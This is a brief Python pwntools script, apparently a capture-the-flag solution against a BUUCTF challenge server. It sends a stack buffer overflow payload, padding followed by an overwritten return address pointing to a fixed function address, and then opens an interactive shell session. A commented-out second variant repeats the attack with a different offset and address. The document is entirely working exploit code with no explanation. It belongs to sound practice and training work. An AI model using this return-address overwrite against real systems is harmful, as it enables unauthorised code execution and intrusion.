from pwn import *


io=remote('node4.buuoj.cn', 29986)
secure_addr=0x400238
payload=b'A'*0x20+b'a'*8+p64(secure_addr)
io.sendlineafter("magic", payload)
io.interactive()

# io=remote('node4.buuoj.cn', 29986)
# fun_addr=0x40079D
# payload=b'A'*68+b'a'*7+p64(fun_addr)
# io.sendline(payload)
# io.interactive()
